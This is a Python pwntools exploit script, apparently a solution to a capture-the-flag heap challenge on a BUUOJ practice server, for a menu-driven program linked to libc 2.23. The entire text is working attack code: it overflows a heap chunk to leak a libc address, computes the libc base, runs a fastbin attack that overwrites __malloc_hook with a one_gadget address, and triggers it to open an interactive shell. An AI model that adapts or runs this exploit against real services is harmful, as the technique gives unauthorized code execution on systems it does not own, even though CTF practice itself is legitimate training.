from pwn import *

io=remote('node3.buuoj.cn',29221)
libc=ELF('./libc-2.23.so')

def add_c():
    io.recvuntil('create: ')
    io.send('aa')
    io.recvuntil('choice:')
    io.sendline('1')
    io.recvuntil('Chapter name:')
    io.send('chp1')

def add_s(name):
    io.recvuntil('choice:')
    io.sendline('2')
    io.recvuntil('add into:')
    io.send('chp1')
    io.recvuntil('name:')
    io.send(name)

def add_t(name,size,data):
    io.recvuntil('choice:')
    io.sendline('3')
    io.recvuntil('add into:')
    io.send(name)
    io.recvuntil('to write:')
    io.send(str(size))
    io.recvuntil('Text:')
    io.send(data)

def update(name,data):
    io.recvuntil('choice:')
    io.sendline('8')
    io.recvuntil('/Text):')
    io.send('Text')
    io.recvuntil('name:')
    io.send(name)
    io.recvuntil('Text:')
    io.send(data)

def free_t(name):
    io.recvuntil('choice:')
    io.sendline('6')  
    io.recvuntil('name:')
    io.send(name)

def show():
    io.recvuntil('choice:')
    io.sendline('7')

def get_shell():
    io.recvuntil('choice:')
    io.sendline('2')
    io.recvuntil('add into:')
    io.send('chp1')

add_c()
add_s('s1')
add_s('s2')
add_s('s3')
add_s('s4')
add_s('s5')
add_t('s1',0xf8,'a')
add_t('s2',0x80,'a')
add_t('s3',0x60,'a')
add_t('s4',0x60,'a')
free_t('s2')
update('s1','a'*0x100)
show()
libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4b78
print(hex(libc_base))
malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+0x4526a
free_t('s4')
update('s3','a'*0x68+p64(0x71)+p64(malloc_hook-0x23))
add_t('s4',0x60,'a')
add_t('s5',0x60,'a'*0x13+p64(one_gadget))
get_shell()

io.interactive()